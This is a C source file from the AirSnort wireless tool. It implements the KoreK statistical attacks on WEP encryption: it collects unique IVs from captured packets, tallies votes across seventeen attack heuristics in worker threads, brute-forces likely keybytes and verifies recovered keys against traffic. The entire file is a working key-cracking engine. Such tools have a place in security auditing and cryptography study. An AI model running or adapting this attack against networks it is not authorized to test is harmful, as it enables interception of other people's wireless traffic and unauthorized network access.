/*
    This file is part of AirSnort.

    Copyright (C) 2004 Snax
    
    Portions Copyright (C) 2004  Christophe Devine

    AirSnort is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    AirSnort is distributed in the hope that it will be useful,
      but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with AirSnort; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

/*
 *  Airsnort incorporation of
 *  Advanced WEP attacks developed by KoreK
 *  As implemented by Christophe Devine in aircrack-2.1
 *    aircrack: http://www.cr0.net:8040/code/network/aircrack
 *  and adapted by Snax for real time cracking
 */

#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#ifndef WIN32
#include <pthread.h>
#include <semaphore.h>
#include <sched.h>
#include <pcap.h>
#else
#include <fcntl.h>
#endif


#include "korek.h"
#include "bssidlist.h"
#include "crack.h"
#include "utils.h"

#define SWAP(x,y) { unsigned char tmp = x; x = y; y = tmp; }

#define SUCCESS  0
#define FAILURE  1
#define INFINITY 65535

/*
 * command-line parameters
 */

int debug_lvl = 0;              /* # of keybytes fixed */
int stability = 0;              /* unstable attacks on */
unsigned char debug[61];        /* user-defined wepkey */
int weplen = 13;                /* WEP key length */
int ffact = 2;                  /* fudge threshold */
int nfork = 1;                  /* number of forks */
unsigned int retry_interval = 0x40000;    /* number of unique packets before we retry a crack */

/*
 * runtime global data
 */

typedef struct {
   int mc_pipe[2];
   int cm_pipe[2];
   int id;
   CrackNode *cn;
} child_data;

#define N_ATTACKS 17

enum KoreK_attacks {
   A_u15,                       /* semi-stable 15% */
   A_s13,                       /* stable 13% */
   A_u13_1,                     /* unstable 13% */
   A_u13_2,                     /* unstable ? 13% */
   A_u13_3,                     /* unstable ? 13% */
   A_s5_1,                      /* standard 5% (~FMS) */
   A_s5_2,                      /* other stable 5% */
   A_s5_3,                      /* other stable 5% */
   A_u5_1,                      /* unstable 5% no good ? */
   A_u5_2,                      /* unstable 5% */
   A_u5_3,                      /* unstable 5% no good */
   A_u5_4,                      /* unstable 5% */
   A_s3,                        /* stable 3% */
   A_4_s13,                     /* stable 13% on q = 4 */
   A_4_u5_1,                    /* unstable 5% on q = 4 */
   A_4_u5_2,                    /* unstable 5% on q = 4 */
   A_neg                        /* helps reject false positives */
};

int coeff_attacks[4][N_ATTACKS] = {
   {15, 13, 12, 12, 12, 5, 5, 5, 3, 4, 3, 4, 3, 13, 4, 4, 0},
   {15, 13, 12, 12, 12, 5, 5, 5, 0, 0, 0, 0, 3, 13, 4, 4, 0},
   {15, 13, 0, 0, 0, 5, 5, 5, 0, 0, 0, 0, 0, 13, 0, 0, 0},
   {0, 13, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
};

unsigned char bits[] = {0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80};

#ifndef WIN32
void* crackit(void*);
#else
DWORD WINAPI crackit(void *);
#endif

void growBuf(buff_t *b, int incr) {
   if (b == NULL) return;
   b->alloc += incr;
   b->buf = (unsigned char*) realloc(b->buf, b->alloc);
}

void addKorekIV(BssidList *apNode, PacketInfo *pi) {
   int n, x;
   unsigned char *ptr;
   const unsigned char *h80211;
#ifndef WIN32
   pthread_t tid;
#endif
   CrackNode *cn = apNode->ap;

   h80211 = pi->iv;
   if (cn->unique == NULL) {
      cn->unique = (unsigned char*) calloc_r(1, 256 * 256 * 32);
   }
   /*
    * have we already seen this IV ?
    */

   n = h80211[0] + (h80211[1] << 8) + (h80211[2] << 16);   //endian independent
   x = n & 7;
   n >>= 3;
   if (cn->unique[n] & bits[x]) return;
   cn->unique[n] |= bits[x];

   cn->data->numUnique++;

   /*
    * nope, add this IV and the first two encrypted bytes
    */
   if (cn->ivbuf.used == cn->ivbuf.alloc) {
      if (cn->num_ivs) {  //could have a cracker running already
         cn->k_die = 1;   //signal cracker to stop
         cn->nb_ivs = cn->num_ivs;    //set the number of ivs the thread will work with
#ifndef WIN32
         sem_wait(&cn->ivbuf.sem);    //cracker stopped if we get the sem  
#else
         WaitForSingleObject(cn->ivbuf.sem, INFINITE);  //cracker stopped if we get the sem  
#endif
         growBuf(&cn->ivbuf, retry_interval * 5);  //retry_interval ivs at a time
         cn->k_die = 0;
#ifndef WIN32
         pthread_create(&tid, NULL, crackit, cn);  //thread will release the semaphore
#else
         SetThreadPriority(CreateThread(NULL, 0, crackit, cn, 0, NULL), THREAD_PRIORITY_BELOW_NORMAL);
#endif
      }
      else {
         growBuf(&cn->ivbuf, retry_interval * 5);  //265k ivs at a time
      }
   }
   ptr = cn->ivbuf.buf + cn->ivbuf.used;

   *ptr++ = *h80211++;
   *ptr++ = *h80211++;
   *ptr++ = *h80211++;
   *ptr++ = *++h80211;
   *ptr++ = *++h80211;

   cn->ivbuf.used += 5;
   cn->num_ivs++;
}

/*
 * safe I/O routines
 */

int safe_read(int fd, void *buf, size_t len) {
   int n;
   size_t sum = 0;
   char *off = (char *) buf;

   while (sum < len) {
      if (!(n = read(fd, (void *) off, len - sum))) return 0;
      if (n < 0 && errno == EINTR) continue;
      if (n < 0) return n;
      sum += n;
      off += n;
   }
   return sum;
}

int safe_write(int fd, void *buf, size_t len) {
   int n;
   size_t sum = 0;
   char *off = (char *) buf;

   while (sum < len) {
      if ((n = write(fd, (void *) off, len - sum)) < 0) {
         if (errno == EINTR) continue;
         return n;
      }
      sum += n;
      off += n;
   }
   return sum;
}

/*
 * each child performs the attacks over nb_ivs / nfork
 */

#ifndef WIN32
void* calc_votes(void *arg) {
#else
DWORD WINAPI calc_votes(void *arg) {
#endif
   unsigned long xv, min, max;
   unsigned char R[256], jj[256];
   unsigned char S[256], Si[256];
   unsigned char K[64], tbuf[64];

   unsigned char io1, o1, io2, o2;
   unsigned char Sq, dq, Kq, jq, q;
   unsigned char S1, S2, J2, t2;

   int i, j, B, votes[N_ATTACKS][256];
   child_data *cd = (child_data*) arg;
   int child = cd->id;
   int result = SUCCESS;

   min = 5 * ((child * cd->cn->nb_ivs) / nfork);
   max = 5 * (((1 + child) * cd->cn->nb_ivs) / nfork);

   for (i = 0; i < 256; i++) R[i] = i;

   while (1) {
      if (safe_read(cd->mc_pipe[0], tbuf, 64) != 64) {
         break;
      }

      B = (int) tbuf[0];

      q = 3 + B;
      memcpy(K + 3, tbuf + 1, B);
      memset(votes, 0, sizeof(votes));

      for (xv = min; xv < max; xv += 5) {
         memcpy(K, cd->cn->ivbuf.buf + xv, 3);
         memcpy(S, R, 256);
         memcpy(Si, R, 256);

         for (i = j = 0; i < q; i++) {
            jj[i] = j = (j + S[i] + K[i & (2 + weplen)]) & 0xFF;
            SWAP(S[i], S[j]);
         }
         i = q;
         do {
            i--;
            SWAP(Si[i], Si[jj[i]]);
         } while (i != 0);

         o1 = cd->cn->ivbuf.buf[xv + 3] ^ 0xAA;
         io1 = Si[o1];
         S1 = S[1];
         o2 = cd->cn->ivbuf.buf[xv + 4] ^ 0xAA;
         io2 = Si[o2];
         S2 = S[2];
         Sq = S[q];
         dq = Sq + jj[q - 1];

         if (S2 == 0) {
            if ((S1 == 2) && (o1 == 2)) {
               Kq = 1 - dq;
               votes[A_neg][Kq]++;
               Kq = 2 - dq;
               votes[A_neg][Kq]++;
            } else if (o2 == 0) {
               Kq = 2 - dq;
               votes[A_neg][Kq]++;
            }
         } else {
            if ((o2 == 0) && (Sq == 0)) {
               Kq = 2 - dq;
               votes[A_u15][Kq]++;
            }
         }

         if ((S1 == 1) && (o1 == S2)) {
            Kq = 1 - dq;
            votes[A_neg][Kq]++;
            Kq = 2 - dq;
            votes[A_neg][Kq]++;
         }

         if ((S1 == 0) && (S[0] == 1) && (o1 == 1)) {
            Kq = 0 - dq;
            votes[A_neg][Kq]++;
            Kq = 1 - dq;
            votes[A_neg][Kq]++;
         }

         if (S1 == q) {
            if (o1 == q) {
               Kq = Si[0] - dq;
               votes[A_s13][Kq]++;
            } else if (((1 - q - o1) & 0xff) == 0) {
               Kq = io1 - dq;
               votes[A_u13_1][Kq]++;
            } else if (io1 < q) {
               jq = Si[(io1 - q) & 0xff];

               if (jq != 1) {
                  Kq = jq - dq;
                  votes[A_u5_1][Kq]++;
               }
            }
         }

         if ((io1 == 2) && (S[q] == 1)) {
            Kq = 1 - dq;
            votes[A_u5_2][Kq]++;
         }

         if (S[q] == q) {
            if ((S1 == 0) && (o1 == q)) {
               Kq = 1 - dq;
               votes[A_u13_2][Kq]++;
            } else if ((((1 - q - S1) & 0xff) == 0) && (o1 == S1)) {
               Kq = 1 - dq;
               votes[A_u13_3][Kq]++;
            } else if ((S1 >= ((-q) & 0xff))
                       && (((q + S1 - io1) & 0xff) == 0)) {
               Kq = 1 - dq;
               votes[A_u5_3][Kq]++;
            }
         }

         if ((S1 < q) && (((S1 + S[S1] - q) & 0xFF) == 0) &&
             (io1 != 1) && (io1 != S[S1])) {
            Kq = io1 - dq;
            votes[A_s5_1][Kq]++;
         }

         if ((S1 > q) && (((S2 + S1 - q) & 0xff) == 0)) {
            if (o2 == S1) {
               jq = Si[(S1 - S2) & 0xFF];

               if ((jq != 1) && (jq != 2)) {
                  Kq = jq - dq;
                  votes[A_s5_2][Kq]++;
               }
            } else if (o2 == ((2 - S2) & 0xFF)) {
               jq = io2;

               if ((jq != 1) && (jq != 2)) {
                  Kq = jq - dq;
                  votes[A_s5_3][Kq]++;
               }
            }
         }

         if ((S[1] != 2) && (S[2] != 0)) {
            J2 = S[1] + S[2];

            if (J2 < q) {
               t2 = S[J2] + S[2];

               if ((t2 == q) && (io2 != 1) && (io2 != 2)
                   && (io2 != J2)) {
                  Kq = io2 - dq;
                  votes[A_s3][Kq]++;
               }
            }
         }

         if (S1 == 2) {
            if (q == 4) {
               if (o2 == 0) {
                  Kq = Si[0] - dq;
                  votes[A_4_s13][Kq]++;
               } else {
                  if ((jj[1] == 2) && (io2 == 0)) {
                     Kq = Si[254] - dq;
                     votes[A_4_u5_1][Kq]++;
                  }
                  if ((jj[1] == 2) && (io2 == 2)) {
                     Kq = Si[255] - dq;
                     votes[A_4_u5_2][Kq]++;
                  }
               }
            } else if ((q > 4) && ((S[4] + 2) == q) &&
                       (io2 != 1) && (io2 != 4)) {
               Kq = io2 - dq;
               votes[A_u5_4][Kq]++;
            }
         }
      }

      if (safe_write(cd->cm_pipe[1], votes, sizeof(votes)) !=
          sizeof(votes)) {
         break;
      }

   } 
#ifndef WIN32
   return NULL;
#else
   return 0;
#endif
}

/*
 * routine that tests if a potential key is valid
 */

int check_wepkey(CrackNode *cn) {
   unsigned char K[64];
   unsigned char S[256];
   unsigned char R[256];
   unsigned char x1, x2;
   unsigned long xv;
   int i, j, n, match;

   match = 0;

   memcpy(K + 3, cn->wepkey, weplen);

   for (i = 0; i < 256; i++) R[i] = i;

   for (n = 0; n < 8; n++) {
      xv = 5 * (rand() % cn->nb_ivs);

      memcpy(K, cn->ivbuf.buf + xv, 3);
      memcpy(S, R, 256);

      for (i = j = 0; i < 256; i++) {
         j = (j + S[i] + K[i & (2 + weplen)]) & 0xFF;
         SWAP(S[i], S[j]);
      }

      i = 1;
      j = (0 + S[i]) & 0xFF;
      SWAP(S[i], S[j]);
      x1 = cn->ivbuf.buf[xv + 3] ^ S[(S[i] + S[j]) & 0xFF];

      i = 2;
      j = (j + S[i]) & 0xFF;
      SWAP(S[i], S[j]);
      x2 = cn->ivbuf.buf[xv + 4] ^ S[(S[i] + S[j]) & 0xFF];

      if ((x1 == 0xAA && x2 == 0xAA) || (x1 == 0xE0 && x2 == 0xE0))
         match++;
   }

   if (match >= 4) return SUCCESS;

   return FAILURE;
}

/*
 * routine used to sort the votes
 */

int cmp_votes(const void *bs1, const void *bs2) {
   if (((byte_stat *) bs1)->votes <
       ((byte_stat *) bs2)->votes)
      return 1;

   if (((byte_stat *) bs1)->votes >
       ((byte_stat *) bs2)->votes)
      return -1;

   return 0;
}

/*
 * this routine computes the average votes and recurses
 */

int do_wep_crack(CrackNode *cn, child_data *cd, int B) {
   int child, i, n, *vi;
   int votes[N_ATTACKS][256];
   unsigned char buffer[sizeof(votes)];

   for (i = 0; i < 256; i++) {
      cn->wpoll[B * 256 + i].index = i;
      cn->wpoll[B * 256 + i].votes = 0;
   }

   /*
    * send B and wepkey to each child
    */

   buffer[0] = (unsigned char) B;
   memcpy(buffer + 1, cn->wepkey, 61);

   for (child = 0; child < nfork; child++) {
      if (safe_write(cd[child].mc_pipe[1], buffer, 64) != 64) {
         perror("in do_wep_crack: write()");
         return FAILURE;
      }
   }

   /*
    * collect the poll results from each child
    */

   if (safe_read(cd[0].cm_pipe[0], votes, sizeof(votes)) !=
       sizeof(votes)) {
      perror("in do_wep_crack: read()");
      return FAILURE;
   }
   for (child = 1; child < nfork; child++) {
      if (safe_read(cd[child].cm_pipe[0], buffer, sizeof(votes)) !=
          sizeof(votes)) {
         perror("in do_wep_crack: read()");
         return FAILURE;
      }
      vi = (int *) buffer;
      for (n = 0; n < N_ATTACKS; n++)
         for (i = 0; i < 256; i++, vi++)
            votes[n][i] += *vi;
   }

   /*
    * compute the average vote and reject the unlikely keybytes
    */

   for (i = 0; i < 256; i++) {
      for (n = 0; n < N_ATTACKS; n++) {
         cn->wpoll[B * 256 + i].votes += coeff_attacks[stability][n] * votes[n][i];
      }
      cn->wpoll[B * 256 + i].votes -= 20 * votes[A_neg][i];
   }

   /*
    * set votes to the max if keybyte is user-defined
    */

   if (B < debug_lvl)
      cn->wpoll[B * 256 + debug[B]].votes = INFINITY;

   /*
    * sort the votes, highest ones first
    */

   qsort(cn->wpoll + B * 256, 256, sizeof(byte_stat), cmp_votes);

   /*
    * see how far we should go based on the number of votes
    */

   for (cn->fudge[B] = 1; cn->fudge[B] < 256; cn->fudge[B]++)
      if (cn->wpoll[B * 256 + cn->fudge[B]].votes < cn->wpoll[B * 256].votes / ffact)
         break;

   /*
    * try the most likely n votes, where n is our current fudge
    */

   for (cn->depth[B] = 0; cn->depth[B] < cn->fudge[B]; cn->depth[B]++) {
      if (cn->k_die) break;    //we have been asked to die so break and return FAILURE
      if (B == weplen - 1)
         cn->data->tried++;

      cn->wepkey[B] = cn->wpoll[B * 256 + cn->depth[B]].index;

      if (B == 4 && weplen == 13) {
         weplen = 5;

         if (check_wepkey(cn) == SUCCESS)
            goto keyfound;

         weplen = 13;
      }

      if (B < weplen - 1) {
         /*
          * this keybyte has been set, attack the next one
          */

         if (do_wep_crack(cn, cd, B + 1) == SUCCESS)
            return SUCCESS;
      } else {
         /*
          * last keybyte reached, so check if wepkey is valid
          */

         if (check_wepkey(cn) == SUCCESS) {
          keyfound:

            /*
             * we have a valid key
             */

            //set cracked status for given AP
            setKey(cn, cn->wepkey, weplen, 'K');

            free_r(cn->ivbuf.buf);        //set cracked status to 'K'
            cn->ivbuf.buf = NULL;
            free_r(cn->unique);           //don't need to track ivs anymore!
            cn->unique = NULL;
            return SUCCESS;
         }
      }
   }
   return FAILURE;
}

#ifndef WIN32
void* crackit(void* arg) {
   pthread_t *p = (pthread_t*)malloc_r(nfork * sizeof(pthread_t));
#else
DWORD WINAPI crackit(void *arg) {
   HANDLE *p = (HANDLE*)malloc_r(nfork * sizeof(HANDLE));
#endif
   int i, result;
//   struct sched_param parms;
   CrackNode *cn = (CrackNode*)arg;
   child_data *cd = (child_data*)malloc_r(nfork * sizeof(child_data));
   
   if (cn->cracked) {
      free_r(p);
      free_r(cd);
#ifndef WIN32
      return (void*)SUCCESS;
#else
      return SUCCESS;
#endif
   }
/*
   sched_getparam(0, &parms);
   parms.sched_priority++;
*/
   /*
    * spawn the threads
    */

   for (i = 0; i < nfork; i++) {
      pipe(cd[i].mc_pipe);
      pipe(cd[i].cm_pipe);
      cd[i].id = i;
      cd[i].cn = cn;
#ifndef WIN32
      if (pthread_create(&p[i], NULL, calc_votes, (void*)&cd[i]) == 0) {
//         pthread_setschedparam(p[i], SCHED_OTHER, &parms);
#else
      if ((p[i] = CreateThread(NULL, 0, calc_votes, (void*)&cd[i], 0, NULL)) != NULL) {
         SetThreadPriority(p[i], THREAD_PRIORITY_BELOW_NORMAL);
#endif
      }
      else {
         result = FAILURE;
         goto leave;
      }
   }

   /*
    * launch the attack
    */

   srand(time(NULL));

   cn->wpoll = (byte_stat*)calloc_r(61 * 256, sizeof(byte_stat));
   cn->wepkey = (unsigned char*)malloc_r(61);       /* the current chosen WEP key */
   cn->fudge = (int*)malloc_r(61 * sizeof(int));    /* bruteforce level (1 to 256) */
   cn->depth = (int*)malloc_r(61 * sizeof(int));    /* how deep we are in the fudge */

   result = do_wep_crack(cn, cd, 0);
   free_r(cn->wpoll);
   free_r(cn->wepkey);
   free_r(cn->fudge);
   free_r(cn->depth);
leave:
   for (i = 0; i < nfork; i++) {
      close(cd[i].mc_pipe[1]);   //close the pipes, children will error out
      close(cd[i].mc_pipe[0]);   //close the pipes, children will error out
      close(cd[i].cm_pipe[1]);   //close the pipes, children will error out
      close(cd[i].cm_pipe[0]);   //close the pipes, children will error out
#ifndef WIN32
      pthread_join(p[i], NULL);
#else
      WaitForSingleObject(p[i], INFINITE);
#endif
   }
   free_r(cd);
   free_r(p);

#ifndef WIN32
   sem_post(&cn->ivbuf.sem);      //release ivbuf
   return (void*)result;
#else
   ReleaseSemaphore(cn->ivbuf.sem, 1, NULL);
   return result;
#endif
}

